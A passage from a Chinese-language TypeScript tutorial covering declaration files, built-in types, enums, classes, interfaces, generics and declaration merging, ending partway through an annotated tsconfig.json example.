&lt;https://github.com/terrymun&gt;// Definitions: https://github.com/DefinitelyTyped/DefinitelyTyped// TypeScript Version: 2.3// 引入声明文件/// &lt;reference types=&quot;sizzle&quot; /&gt;/// &lt;reference path=&quot;JQueryStatic.d.ts&quot; /&gt;/// &lt;reference path=&quot;JQuery.d.ts&quot; /&gt;/// &lt;reference path=&quot;misc.d.ts&quot; /&gt;/// &lt;reference path=&quot;legacy.d.ts&quot; /&gt;export = jQuery;\n\n\n我们可以直接下载下来使用，但是更推荐的是使用工具统一管理第三方库的声明文件- 社区已经有多种方式引入声明文件，不过 TypeScript 2.0推荐使用 @types 来管理。\n@types 的使用方式很简单，直接用 npm 安装对应的声明模块即可，以 jQuery 举例\n\nnpm install @types/jquery --save-dev\n\n可以在这个页面搜索你需要的声明文件\n\nhttp://microsoft.github.io/TypeSearch/\n\n2.10 内置对象\nJavaScript 中有很多内置对象，它们可以直接在 TypeScript 中当做定义好了的类型\n\n\n内置对象是指根据标准在全局作用域（Global）上存在的对象。这里的标准是指 ECMAScript 和其他环境（比如 DOM）的标准\n\n2.10.1 ECMAScript 的内置对象ECMAScript 标准提供的内置对象有\n\nBoolean、Error、Date、RegExp 等\n\n我们可以在 TypeScript 中将变量定义为这些类型：\nlet b: Boolean = new Boolean(1);let e: Error = new Error(&#x27;Error occurred&#x27;);let d: Date = new Date();let r: RegExp = /[a-z]/;\n\n\n更多的内置对象，可以查看 MDN 的文档\n\n\n而他们的定义文件，则在 TypeScript 核心库的定义文件中\n\n2.10.2 DOM 和 BOM 的内置对象DOM 和 BOM 提供的内置对象有\n\nDocument、HTMLElement、Event、NodeList 等。\n\n\nTypeScript 中会经常用到这些类型\n\nlet body: HTMLElement = document.body;let allDiv: NodeList = document.querySelectorAll(&#x27;div&#x27;);document.addEventListener(&#x27;click&#x27;, function(e: MouseEvent) &#123;  // Do something&#125;);\n\n\n它们的定义文件同样在 TypeScript 核心库的定义文件中\n\n2.10.3 TypeScript 核心库的定义文件\nTypeScript 核心库的定义文件中定义了所有浏览器环境需要用到的类型，并且是预置在 TypeScript 中的\n\n\n当你在使用一些常用的方法的时候，TypeScript 实际上已经帮你做了很多类型判断的工作了，比如\n\nMath.pow(10, &#x27;2&#x27;);// index.ts(1,14): error TS2345: Argument of type &#x27;string&#x27; is not assignable to parameter of type &#x27;number&#x27;.\n\n\n上面的例子中，Math.pow 必须接受两个 number 类型的参数。事实上 Math.pow的类型定义如下\n\ninterface Math &#123;    /**     * Returns the value of a base expression taken to a specified power.     * @param x The base value of the expression.     * @param y The exponent value of the expression.     */    pow(x: number, y: number): number;&#125;\n\n\n再举一个 DOM 中的例子\n\ndocument.addEventListener(&#x27;click&#x27;, function(e) &#123;    console.log(e.targetCurrent);&#125;);// index.ts(2,17): error TS2339: Property &#x27;targetCurrent&#x27; does not exist on type &#x27;MouseEvent&#x27;.\n\n\n上面的例子中，addEventListener 方法是在 TypeScript 核心库中定义的\n\ninterface Document extends Node, GlobalEventHandlers, NodeSelector, DocumentEvent &#123;    addEventListener(type: string, listener: (ev: MouseEvent) =&gt; any, useCapture?: boolean): void;&#125;\n\n\n所以 e 被推断成了 MouseEvent，而 MouseEvent 是没有 targetCurrent 属性的，所以报错了\n\n注意，TypeScript 核心库的定义中不包含 Node.js 部分\n2.10.4 用 TypeScript 写 Node.js\nNode.js 不是内置对象的一部分，如果想用 TypeScript 写 Node.js，则需要引入第三方声明文件\n\nnpm install @types/node --save-dev\n\n三、进阶3.1 类型别名\n类型别名用来给一个类型起个新名字\n\ntype Name = string;type NameResolver = () =&gt; string;type NameOrResolver = Name | NameResolver; // 联合类型function getName(n: NameOrResolver): Name &#123;    if (typeof n === &#x27;string&#x27;) &#123;        return n;    &#125; else &#123;        return n();    &#125;&#125;\n\n上例中，我们使用 type 创建类型别名。\n\n类型别名常用于联合类型\n\n3.2 字符串字面量类型\n字符串字面量类型用来约束取值只能是某几个字符串中的一个\n\ntype EventNames = &#x27;click&#x27; | &#x27;scroll&#x27; | &#x27;mousemove&#x27;;function handleEvent(ele: Element, event: EventNames) &#123;    // do something&#125;handleEvent(document.getElementById(&#x27;hello&#x27;), &#x27;scroll&#x27;);  // 没问题handleEvent(document.getElementById(&#x27;world&#x27;), &#x27;dbclick&#x27;); // 报错，event 不能为 &#x27;dbclick&#x27;// index.ts(7,47): error TS2345: Argument of type &#x27;&quot;dbclick&quot;&#x27; is not assignable to parameter of type &#x27;EventNames&#x27;.\n\n\n上例中，我们使用 type 定了一个字符串字面量类型 EventNames，它只能取三种字符串中的一种。\n\n注意，类型别名与字符串字面量类型都是使用 type 进行定\n3.3 元组\n数组合并了相同类型的对象，而元组（Tuple）合并了不同类型的对象。\n元组起源于函数编程语言,在这些语言中频繁使用元组。\n\n3.3.1 简单的例子\n定义一对值分别为 string 和 number的元组\n\nlet user: [string, number] = [&#x27;poetries&#x27;, 22];\n\n\n当赋值或访问一个已知索引的元素时，会得到正确的类型\n\nlet user: [string, number];user[0] = &#x27;poetries&#x27;;user[1] = 22;user[0].slice(1);user[1].toFixed(2);\n\n\n也可以只赋值其中一项\n\nlet user: [string, number];user[0] = &#x27;poetries&#x27;;\n\n3.3.2 越界的元素\n当添加越界的元素时，它的类型会被限制为元组中每个类型的联合类型\n\nlet user: [string, number];user = [&#x27;poetries&#x27;, 22];user.push(&#x27;http://blog.poetries.top&#x27;);user.push(true);// index.ts(4,14): error TS2345: Argument of type &#x27;boolean&#x27; is not assignable to parameter of type &#x27;string | number&#x27;.//   Type &#x27;boolean&#x27; is not assignable to type &#x27;number&#x27;.\n\n3.4 枚举\n枚举（Enum）类型用于取值被限定在一定范围内的场景，比如一周只能有七天，颜色限定为红绿蓝等\n\n3.4.1 简单的例子\n枚举使用 enum 关键字来定义：\n\nenum Days &#123;Sun, Mon, Tue, Wed, Thu, Fri, Sat&#125;;\n\n\n枚举成员会被赋值为从 0 开始递增的数字，同时也会对枚举值到枚举名进行反向映射\n\nenum Days &#123;Sun, Mon, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days[&quot;Sun&quot;] === 0); // trueconsole.log(Days[&quot;Mon&quot;] === 1); // trueconsole.log(Days[&quot;Tue&quot;] === 2); // trueconsole.log(Days[&quot;Sat&quot;] === 6); // trueconsole.log(Days[0] === &quot;Sun&quot;); // trueconsole.log(Days[1] === &quot;Mon&quot;); // trueconsole.log(Days[2] === &quot;Tue&quot;); // trueconsole.log(Days[6] === &quot;Sat&quot;); // true\n\n\n事实上，上面的例子会被编译为\n\nvar Days;(function (Days) &#123;    Days[Days[&quot;Sun&quot;] = 0] = &quot;Sun&quot;;    Days[Days[&quot;Mon&quot;] = 1] = &quot;Mon&quot;;    Days[Days[&quot;Tue&quot;] = 2] = &quot;Tue&quot;;    Days[Days[&quot;Wed&quot;] = 3] = &quot;Wed&quot;;    Days[Days[&quot;Thu&quot;] = 4] = &quot;Thu&quot;;    Days[Days[&quot;Fri&quot;] = 5] = &quot;Fri&quot;;    Days[Days[&quot;Sat&quot;] = 6] = &quot;Sat&quot;;&#125;)(Days || (Days = &#123;&#125;));\n\n3.4.2 手动赋值\n我们也可以给枚举项手动赋值\n\nenum Days &#123;Sun = 7, Mon = 1, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days[&quot;Sun&quot;] === 7); // trueconsole.log(Days[&quot;Mon&quot;] === 1); // trueconsole.log(Days[&quot;Tue&quot;] === 2); // trueconsole.log(Days[&quot;Sat&quot;] === 6); // true\n\n\n上面的例子中，未手动赋值的枚举项会接着上一个枚举项递增\n\n如果未手动赋值的枚举项与手动赋值的重复了，TypeScript 是不会察觉到这一点的\nenum Days &#123;Sun = 3, Mon = 1, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days[&quot;Sun&quot;] === 3); // trueconsole.log(Days[&quot;Wed&quot;] === 3); // trueconsole.log(Days[3] === &quot;Sun&quot;); // falseconsole.log(Days[3] === &quot;Wed&quot;); // true\n\n\n上面的例子中，递增到 3 的时候与前面的 Sun 的取值重复了，但是 TypeScript 并没有报错，导致 Days[3]的值先是 &quot;Sun&quot;，而后又被 &quot;Wed&quot; 覆盖了。编译的结果是\n\nvar Days;(function (Days) &#123;    Days[Days[&quot;Sun&quot;] = 3] = &quot;Sun&quot;;    Days[Days[&quot;Mon&quot;] = 1] = &quot;Mon&quot;;    Days[Days[&quot;Tue&quot;] = 2] = &quot;Tue&quot;;    Days[Days[&quot;Wed&quot;] = 3] = &quot;Wed&quot;;    Days[Days[&quot;Thu&quot;] = 4] = &quot;Thu&quot;;    Days[Days[&quot;Fri&quot;] = 5] = &quot;Fri&quot;;    Days[Days[&quot;Sat&quot;] = 6] = &quot;Sat&quot;;&#125;)(Days || (Days = &#123;&#125;));\n\n所以使用的时候需要注意，最好不要出现这种覆盖的情况。\n\n手动赋值的枚举项可以不是数字，此时需要使用类型断言来让 tsc 无视类型检查 (编译出的 js 仍然是可用的)：\n\nenum Days &#123;Sun = 7, Mon, Tue, Wed, Thu, Fri, Sat = &lt;any&gt;&quot;S&quot;&#125;;var Days;(function (Days) &#123;    Days[Days[&quot;Sun&quot;] = 7] = &quot;Sun&quot;;    Days[Days[&quot;Mon&quot;] = 8] = &quot;Mon&quot;;    Days[Days[&quot;Tue&quot;] = 9] = &quot;Tue&quot;;    Days[Days[&quot;Wed&quot;] = 10] = &quot;Wed&quot;;    Days[Days[&quot;Thu&quot;] = 11] = &quot;Thu&quot;;    Days[Days[&quot;Fri&quot;] = 12] = &quot;Fri&quot;;    Days[Days[&quot;Sat&quot;] = &quot;S&quot;] = &quot;Sat&quot;;&#125;)(Days || (Days = &#123;&#125;));\n\n\n当然，手动赋值的枚举项也可以为小数或负数，此时后续未手动赋值的项的递增步长仍为 1：\n\nenum Days &#123;Sun = 7, Mon = 1.5, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days[&quot;Sun&quot;] === 7); // trueconsole.log(Days[&quot;Mon&quot;] === 1.5); // trueconsole.log(Days[&quot;Tue&quot;] === 2.5); // trueconsole.log(Days[&quot;Sat&quot;] === 6.5); // true\n\n3.4.3 常数项和计算所得项\n枚举项有两种类型：常数项（constant member）和计算所得项（computed member）\n\n前面我们所举的例子都是常数项，一个典型的计算所得项的例子：\nenum Color &#123;Red, Green, Blue = &quot;blue&quot;.length&#125;;\n\n\n上面的例子中，&quot;blue&quot;.length 就是一个计算所得项。\n\n上面的例子不会报错，但是如果紧接在计算所得项后面的是未手动赋值的项，那么它就会因为无法获得初始值而报错\nenum Color &#123;Red = &quot;red&quot;.length, Green, Blue&#125;;// index.ts(1,33): error TS1061: Enum member must have initializer.// index.ts(1,40): error TS1061: Enum member must have initializer.\n\n3.4.4 常数枚举\n常数枚举是使用 const enum 定义的枚举类型\n\nconst enum Directions &#123;    Up,    Down,    Left,    Right&#125;let directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right];\n\n\n常数枚举与普通枚举的区别是，它会在编译阶段被删除，并且不能包含计算成员\n\n//上例的编译结果是：var directions = [0 /* Up */, 1 /* Down */, 2 /* Left */, 3 /* Right */];// 假如包含了计算成员，则会在编译阶段报错：const enum Color &#123;Red, Green, Blue = &quot;blue&quot;.length&#125;;// index.ts(1,38): error TS2474: In &#x27;const&#x27; enum declarations member initializer must be constant expression.\n\n3.4.5 外部枚举\n外部枚举（Ambient Enums）是使用 declare enum 定义的枚举类型\n\ndeclare enum Directions &#123;    Up,    Down,    Left,    Right&#125;let directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right];\n\n\n之前提到过，declare 定义的类型只会用于编译时的检查，编译结果中会被删除。\n\n上例的编译结果是：\nvar directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right];\n\n\n外部枚举与声明语句一样，常出现在声明文件中。\n同时使用 declare 和 const 也是可以的：\n\ndeclare const enum Directions &#123;    Up,    Down,    Left,    Right&#125;let directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right];// 编译结果：var directions = [0 /* Up */, 1 /* Down */, 2 /* Left */, 3 /* Right */];\n\n3.5 类3.5.1 类的概念\n类相关的概念做一个简单的介绍\n\n\n类(Class)：定义了一件事物的抽象特点，包含它的属性和方法\n对象（Object）：类的实例，通过 new 生成\n面向对象（OOP）的三大特性：封装、继承、多态\n封装（Encapsulation）：将对数据的操作细节隐藏起来，只暴露对外的接口。外界调用端不需要（也不可能）知道细节，就能通过对外提供的接口来访问该对象，同时也保证了外界无法任意更改对象内部的数据\n继承（Inheritance）：子类继承父类，子类除了拥有父类的所有特性外，还有一些更具体的特性\n多态（Polymorphism）：由继承而产生了相关的不同的类，对同一个方法可以有不同的响应。比如 Cat 和 Dog 都继承自 Animal，但是分别实现了自己的 eat 方法。此时针对某一个实例，我们无需了解它是 Cat还是 Dog，就可以直接调用 eat方法，程序会自动判断出来应该如何执行 eat\n存取器（getter &amp; setter）：用以改变属性的读取和赋值行为\n修饰符（Modifiers）：修饰符是一些关键字，用于限定成员或类型的性质。比如 public 表示公有属性或方法\n抽象类（Abstract Class）：抽象类是供其他类继承的基类，抽象类不允许被实例化。抽象类中的抽象方法必须在子类中被实现\n接口（Interfaces）：不同类之间公有的属性或方法，可以抽象成一个接口。接口可以被类实现（implements）。一个类只能继承自另一个类，但是可以实现多个接口\n\n3.5.2 public private 和 protected\nTypeScript` 可以使用三种访问修饰符（`Access Modifiers`），分别是 `public`、`private` 和 `protected\n\n\npublic 修饰的属性或方法是公有的，可以在任何地方被访问到，默认所有的属性和方法都是 public 的\nprivate 修饰的属性或方法是私有的，不能在声明它的类的外部访问\nprotected 修饰的属性或方法是受保护的，它和 private 类似，区别是它在子类中也是允许被访问的\n\nclass Animal &#123;    public name;    public constructor(name) &#123;        this.name = name;    &#125;&#125;let a = new Animal(&#x27;Jack&#x27;);console.log(a.name); // Jacka.name = &#x27;Tom&#x27;;console.log(a.name); // Tom\n\n\n上面的例子中，name 被设置为了 public，所以直接访问实例的 name 属性是允许的。\n\n很多时候，我们希望有的属性是无法直接存取的，这时候就可以用 private 了\nlass Animal &#123;    private name;    public constructor(name) &#123;        this.name = name;    &#125;&#125;let a = new Animal(&#x27;Jack&#x27;);console.log(a.name); // Jacka.name = &#x27;Tom&#x27;;// index.ts(9,13): error TS2341: Property &#x27;name&#x27; is private and only accessible within class &#x27;Animal&#x27;.// index.ts(10,1): error TS2341: Property &#x27;name&#x27; is private and only accessible within class &#x27;Animal&#x27;.\n\n\n上面的例子编译后的代码是：\n\nvar Animal = (function () &#123;    function Animal(name) &#123;        this.name = name;    &#125;    return Animal;&#125;());var a = new Animal(&#x27;Jack&#x27;);console.log(a.name);a.name = &#x27;Tom&#x27;;\n\n\n使用 private 修饰的属性或方法，在子类中也是不允许访问的：\n\nclass Animal &#123;    private name;    public constructor(name) &#123;        this.name = name;    &#125;&#125;class Cat extends Animal &#123;    constructor(name) &#123;        super(name);        console.log(this.name);    &#125;&#125;// index.ts(11,17): error TS2341: Property &#x27;name&#x27; is private and only accessible within class &#x27;Animal&#x27;.\n\n\n而如果是用 protected 修饰，则允许在子类中访问\n\nclass Animal &#123;    protected name;    public constructor(name) &#123;        this.name = name;    &#125;&#125;class Cat extends Animal &#123;    constructor(name) &#123;        super(name);        console.log(this.name);    &#125;&#125;\n\n3.5.3 抽象类\nabstract 用于定义抽象类和其中的抽象方法。\n\n什么是抽象类？\n\n首先，抽象类是不允许被实例化的\n\nabstract class Animal &#123;    public name;    public constructor(name) &#123;        this.name = name;    &#125;    public abstract sayHi();&#125;let a = new Animal(&#x27;Jack&#x27;);// index.ts(9,11): error TS2511: Cannot create an instance of the abstract class &#x27;Animal&#x27;.\n\n\n上面的例子中，我们定义了一个抽象类 Animal，并且定义了一个抽象方法 sayHi。在实例化抽象类的时候报错了。\n\n其次，抽象类中的抽象方法必须被子类实现\nabstract class Animal &#123;    public name;    public constructor(name) &#123;        this.name = name;    &#125;    public abstract sayHi();&#125;class Cat extends Animal &#123;    public eat() &#123;        console.log(`$&#123;this.name&#125; is eating.`);    &#125;&#125;let cat = new Cat(&#x27;Tom&#x27;);// index.ts(9,7): error TS2515: Non-abstract class &#x27;Cat&#x27; does not implement inherited abstract member &#x27;sayHi&#x27; from class &#x27;Animal&#x27;.\n\n\n上面的例子中，我们定义了一个类 Cat 继承了抽象类 Animal，但是没有实现抽象方法 sayHi，所以编译报错了。\n\n下面是一个正确使用抽象类的例子：\nabstract class Animal &#123;    public name;    public constructor(name) &#123;        this.name = name;    &#125;    public abstract sayHi();&#125;class Cat extends Animal &#123;    public sayHi() &#123;        console.log(`Meow, My name is $&#123;this.name&#125;`);    &#125;&#125;let cat = new Cat(&#x27;Tom&#x27;);\n\n上面的例子中，我们实现了抽象方法 sayHi，编译通过了。\n\n需要注意的是，即使是抽象方法，TypeScript 的编译结果中，仍然会存在这个类，上面的代码的编译结果是：\n\nvar __extends = (this &amp;&amp; this.__extends) || function (d, b) &#123;    for (var p in b) if (b.hasOwnProperty(p)) d[p] = b[p];    function __() &#123; this.constructor = d; &#125;    d.prototype = b === null ? Object.create(b) : (__.prototype = b.prototype, new __());&#125;;var Animal = (function () &#123;    function Animal(name) &#123;        this.name = name;    &#125;    return Animal;&#125;());var Cat = (function (_super) &#123;    __extends(Cat, _super);    function Cat() &#123;        _super.apply(this, arguments);    &#125;    Cat.prototype.sayHi = function () &#123;        console.log(&#x27;Meow, My name is &#x27; + this.name);    &#125;;    return Cat;&#125;(Animal));var cat = new Cat(&#x27;Tom&#x27;);\n\n3.5.4 类的类型\n给类加上 TypeScript 的类型很简单，与接口类似：\n\nclass Animal &#123;    name: string;    constructor(name: string) &#123;        this.name = name;    &#125;    sayHi(): string &#123;      return `My name is $&#123;this.name&#125;`;    &#125;&#125;let a: Animal = new Animal(&#x27;Jack&#x27;);console.log(a.sayHi()); // My name is Jack\n\n3.6 类与接口3.6.1 类实现接口\n实现（implements）是面向对象中的一个重要概念。一般来讲，一个类只能继承自另一个类，有时候不同类之间可以有一些共有的特性，这时候就可以把特性提取成接口（interfaces），用 implements 关键字来实现。这个特性大大提高了面向对象的灵活性\n\n举例来说，门是一个类，防盗门是门的子类。如果防盗门有一个报警器的功能，我们可以简单的给防盗门添加一个报警方法。这时候如果有另一个类，车，也有报警器的功能，就可以考虑把报警器提取出来，作为一个接口，防盗门和车都去实现它\ninterface Alarm &#123;    alert();&#125;class Door &#123;&#125;class SecurityDoor extends Door implements Alarm &#123;    alert() &#123;        console.log(&#x27;SecurityDoor alert&#x27;);    &#125;&#125;class Car implements Alarm &#123;    alert() &#123;        console.log(&#x27;Car alert&#x27;);    &#125;&#125;\n\n一个类可以实现多个接口\ninterface Alarm &#123;    alert();&#125;interface Light &#123;    lightOn();    lightOff();&#125;class Car implements Alarm, Light &#123;    alert() &#123;        console.log(&#x27;Car alert&#x27;);    &#125;    lightOn() &#123;        console.log(&#x27;Car light on&#x27;);    &#125;    lightOff() &#123;        console.log(&#x27;Car light off&#x27;);    &#125;&#125;\n\n\n上例中，Car 实现了 Alarm 和 Light接口，既能报警，也能开关车灯\n\n3.6.2 接口继承接口\n接口与接口之间可以是继承关系\n\ninterface Alarm &#123;    alert();&#125;interface LightableAlarm extends Alarm &#123;    lightOn();    lightOff();&#125;\n\n\n上例中，我们使用 extends 使 LightableAlarm 继承 Alarm\n\n3.6.3 接口继承类\n接口也可以继承类：\n\nclass Point &#123;    x: number;    y: number;&#125;interface Point3d extends Point &#123;    z: number;&#125;let point3d: Point3d = &#123;x: 1, y: 2, z: 3&#125;;\n\n3.6.4 混合类型\n可以使用接口的方式来定义一个函数需要符合的形状\n\ninterface SearchFunc &#123;    (source: string, subString: string): boolean;&#125;let mySearch: SearchFunc;mySearch = function(source: string, subString: string) &#123;    return source.search(subString) !== -1;&#125;\n\n\n有时候，一个函数还可以有自己的属性和方法\n\ninterface Counter &#123;    (start: number): string;    interval: number;    reset(): void;&#125;function getCounter(): Counter &#123;    let counter = &lt;Counter&gt;function (start: number) &#123; &#125;;    counter.interval = 123;    counter.reset = function () &#123; &#125;;    return counter;&#125;let c = getCounter();c(10);c.reset();c.interval = 5.0;\n\n3.7 泛型\n泛型（Generics）是指在定义函数、接口或类的时候，不预先指定具体的类型，而在使用的时候再指定类型的一种特性\n\n3.7.1 简单的例子\n首先，我们来实现一个函数 createArray，它可以创建一个指定长度的数组，同时将每一项都填充一个默认值\n\nfunction createArray(length: number, value: any): Array&lt;any&gt; &#123;    let result = [];    for (let i = 0; i &lt; length; i++) &#123;        result[i] = value;    &#125;    return result;&#125;createArray(3, &#x27;x&#x27;); // [&#x27;x&#x27;, &#x27;x&#x27;, &#x27;x&#x27;]\n\n\n上例中，我们使用了之前提到过的数组泛型来定义返回值的类型。\n这段代码编译不会报错，但是一个显而易见的缺陷是，它并没有准确的定义返回值的类型：Array 允许数组的每一项都为任意类型。但是我们预期的是，数组中每一项都应该是输入的value 的类型。\n\n\n这时候，泛型就派上用场了：\n\nfunction createArray&lt;T&gt;(length: number, value: T): Array&lt;T&gt; &#123;    let result: T[] = [];    for (let i = 0; i &lt; length; i++) &#123;        result[i] = value;    &#125;    return result;&#125;createArray&lt;string&gt;(3, &#x27;x&#x27;); // [&#x27;x&#x27;, &#x27;x&#x27;, &#x27;x&#x27;]\n\n\n上例中，我们在函数名后添加了 &#96;&#96;，其中 T 用来指代任意输入的类型，在后面的输入 value: T和输出 Array中即可使用了\n\n接着在调用的时候，可以指定它具体的类型为 string。当然，也可以不手动指定，而让类型推论自动推算出来\nfunction createArray&lt;T&gt;(length: number, value: T): Array&lt;T&gt; &#123;    let result: T[] = [];    for (let i = 0; i &lt; length; i++) &#123;        result[i] = value;    &#125;    return result;&#125;createArray(3, &#x27;x&#x27;); // [&#x27;x&#x27;, &#x27;x&#x27;, &#x27;x&#x27;]\n\n3.7.2 多个类型参数\n定义泛型的时候，可以一次定义多个类型参数：\n\nfunction swap&lt;T, U&gt;(tuple: [T, U]): [U, T] &#123;    return [tuple[1], tuple[0]];&#125;swap([7, &#x27;seven&#x27;]); // [&#x27;seven&#x27;, 7]\n\n\n上例中，我们定义了一个 swap 函数，用来交换输入的元组\n\n3.7.3 泛型约束\n在函数内部使用泛型变量的时候，由于事先不知道它是哪种类型，所以不能随意的操作它的属性或方法\n\nfunction loggingIdentity&lt;T&gt;(arg: T): T &#123;    console.log(arg.length);    return arg;&#125;// index.ts(2,19): error TS2339: Property &#x27;length&#x27; does not exist on type &#x27;T&#x27;.\n\n\n上例中，泛型 T 不一定包含属性 length，所以编译的时候报错了。\n\n\n这时，我们可以对泛型进行约束，只允许这个函数传入那些包含length 属性的变量。这就是泛型约束\n\ninterface Lengthwise &#123;    length: number;&#125;function loggingIdentity&lt;T extends Lengthwise&gt;(arg: T): T &#123;    console.log(arg.length);    return arg;&#125;\n\n\n上例中，我们使用了 extends约束了泛型 T 必须符合接口 Lengthwise 的形状，也就是必须包含 length 属性。\n\n\n此时如果调用 loggingIdentity 的时候，传入的 arg不包含 length，那么在编译阶段就会报错了\n\ninterface Lengthwise &#123;    length: number;&#125;function loggingIdentity&lt;T extends Lengthwise&gt;(arg: T): T &#123;    console.log(arg.length);    return arg;&#125;loggingIdentity(7);// index.ts(10,17): error TS2345: Argument of type &#x27;7&#x27; is not assignable to parameter of type &#x27;Lengthwise&#x27;.\n\n多个类型参数之间也可以互相约束：\nfunction copyFields&lt;T extends U, U&gt;(target: T, source: U): T &#123;    for (let id in source) &#123;        target[id] = (&lt;T&gt;source)[id];    &#125;    return target;&#125;let x = &#123; a: 1, b: 2, c: 3, d: 4 &#125;;copyFields(x, &#123; b: 10, d: 20 &#125;);\n\n\n上例中，我们使用了两个类型参数，其中要求 T 继承 U，这样就保证了U 上不会出现 T 中不存在的字段\n\n3.7.4 泛型接口\n可以使用接口的方式来定义一个函数需要符合的形状\n\ninterface SearchFunc &#123;  (source: string, subString: string): boolean;&#125;let mySearch: SearchFunc;mySearch = function(source: string, subString: string) &#123;    return source.search(subString) !== -1;&#125;\n\n\n当然也可以使用含有泛型的接口来定义函数的形状\n\ninterface CreateArrayFunc &#123;    &lt;T&gt;(length: number, value: T): Array&lt;T&gt;;&#125;let createArray: CreateArrayFunc;createArray = function&lt;T&gt;(length: number, value: T): Array&lt;T&gt; &#123;    let result: T[] = [];    for (let i = 0; i &lt; length; i++) &#123;        result[i] = value;    &#125;    return result;&#125;createArray(3, &#x27;x&#x27;); // [&#x27;x&#x27;, &#x27;x&#x27;, &#x27;x&#x27;]\n\n\n进一步，我们可以把泛型参数提前到接口名上\n\ninterface CreateArrayFunc&lt;T&gt; &#123;    (length: number, value: T): Array&lt;T&gt;;&#125;let createArray: CreateArrayFunc&lt;any&gt;;createArray = function&lt;T&gt;(length: number, value: T): Array&lt;T&gt; &#123;    let result: T[] = [];    for (let i = 0; i &lt; length; i++) &#123;        result[i] = value;    &#125;    return result;&#125;createArray(3, &#x27;x&#x27;); // [&#x27;x&#x27;, &#x27;x&#x27;, &#x27;x&#x27;]\n\n\n注意，此时在使用泛型接口的时候，需要定义泛型的类型\n\n3.7.5 泛型类\n与泛型接口类似，泛型也可以用于类的类型定义中\n\nclass GenericNumber&lt;T&gt; &#123;    zeroValue: T;    add: (x: T, y: T) =&gt; T;&#125;let myGenericNumber = new GenericNumber&lt;number&gt;();myGenericNumber.zeroValue = 0;myGenericNumber.add = function(x, y) &#123; return x + y; &#125;;\n\n3.7.6 泛型参数的默认类型\n在 TypeScript 2.3以后，我们可以为泛型中的类型参数指定默认类型。当使用泛型时没有在代码中直接指定类型参数，从实际值参数中也无法推测出时，这个默认类型就会起作用\n\nfunction createArray&lt;T = string&gt;(length: number, value: T): Array&lt;T&gt; &#123;    let result: T[] = [];    for (let i = 0; i &lt; length; i++) &#123;        result[i] = value;    &#125;    return result;&#125;\n\n3.8 声明合并\n如果定义了两个相同名字的函数、接口或类，那么它们会合并成一个类型\n\n3.8.1 函数的合并\n我们可以使用重载定义多个函数类型\n\nfunction reverse(x: number): number;function reverse(x: string): string;function reverse(x: number | string): number | string &#123;    if (typeof x === &#x27;number&#x27;) &#123;        return Number(x.toString().split(&#x27;&#x27;).reverse().join(&#x27;&#x27;));    &#125; else if (typeof x === &#x27;string&#x27;) &#123;        return x.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);    &#125;&#125;\n\n3.8.2 接口的合并\n接口中的属性在合并时会简单的合并到一个接口中\n\ninterface Alarm &#123;    price: number;&#125;interface Alarm &#123;    weight: number;&#125;\n\n\n相当于：\n\ninterface Alarm &#123;    price: number;    weight: number;&#125;\n\n注意，合并的属性的类型必须是唯一的\ninterface Alarm &#123;    price: number;&#125;interface Alarm &#123;    price: number;  // 虽然重复了，但是类型都是 `number`，所以不会报错    weight: number;&#125;interface Alarm &#123;    price: number;&#125;interface Alarm &#123;    price: string;  // 类型不一致，会报错    weight: number;&#125;// index.ts(5,3): error TS2403: Subsequent variable declarations must have the same type.  Variable &#x27;price&#x27; must be of type &#x27;number&#x27;, but here has type &#x27;string&#x27;.\n\n接口中方法的合并，与函数的合并一样\ninterface Alarm &#123;    price: number;    alert(s: string): string;&#125;interface Alarm &#123;    weight: number;    alert(s: string, n: number): string;&#125;\n\n相当于：\ninterface Alarm &#123;    price: number;    weight: number;    alert(s: string): string;    alert(s: string, n: number): string;&#125;\n\n3.8.3 类的合并\n类的合并与接口的合并规则一致\n\n四、工程4.1 tsconfig.json编译选项\n\n你可以通过 compilerOptions 来定制你的编译选项\n\n&#123;  &quot;compilerOptions&quot;: &#123;    /* 基本选项 */    &quot;target&quot;: &quot;es5&quot;,                       // 指定 ECMAScript 目标版本: &#x27;ES3&#x27; (default), &#x27;ES5&#x27;, &#x27;ES2015&#x27;, &#x27;ES2016&#x27;, &#x27;ES2017&#x27;, or &#x27;ESNEXT&#x27;    &quot;module&quot;: &quot;commonjs&quot;,                  // 指定使用模块: &#x27;commonjs&#x27;, &#x27;amd&#x27;, &#x27;system&#x27;, &#x27;umd&#x27; or &#x27;es2015&#x27;    &quot;lib&quot;: [],                             // 指定要包含在编译中的库文件    &quot;allowJs&quot;: true,                       // 允许编译 javascript 文件    &quot;checkJs&quot;: true,                       // 报告 javascript 文件中的错误    &quot;jsx&quot;: &quot;preserve&quot;,                     // 指定 jsx 代码的生成: &#x27;preserve&#x27;, &#x27;react-native&#x27;, or &#x27;react&#x27;    &quot;declaration&quot;: true,                   // 生成相应的 &#x27;.d.ts&#x27; 文件    &quot;sourceMap&quot;: true,                     // 生成相应的 &#x27;.map&#x27; 文件    &quot;outFile&quot;: &quot;./&quot;,                       // 将输出文件合并为一个文件    &quot;outDir&quot;: &quot;./&quot;,                        // 指定输出目录    &quot;rootDir&quot;: &quot;./&quot;,                       // 用来控制输出目录结构 --outDir.    &quot;removeComments&quot;: true,                // 删除编译后的所有的注释    &quot;noEmit&quot;: true,                        // 不生成输出文件    &quot;importHelpers&quot;: true,                 // 从 tslib 导入辅助工具函数    &quot;isolatedModules&quot;: true,               // 将每个文件做为单独的模块 （与 &#x27;ts.transpileModule&#x27; 类似）.    /* 严格的类型检查选项 */    &quot;strict&quot;: true,                        // 启用所有严格类型检查选项    &quot;noImplicitAny&quot;: true,                 // 在表达式和声明上有隐含的 any类型时报错    &quot;strictNullChecks&quot;: true,              // 启用严格的 null 检查    &quot;noImplicitThis&quot;: true,                // 当 this 表达式值为 any 类型的时候，生成一个错误    &quot;alwaysStrict&quot;: true,                  // 以严格模式检查每个模块，并在每个文件里加入 &#x27;use strict&#x27;    /* 额外的检查 */    &quot;noUnusedLocals&quot;: true,                // 有未使用的变量时，抛出错误    &quot;noUnusedParameters&quot;: true,            // 有未使用的参数时，抛出错误    &quot;noImplicitReturns&quot;: true,             // 并不是所有函数里的代码都有返回值时，抛出错误    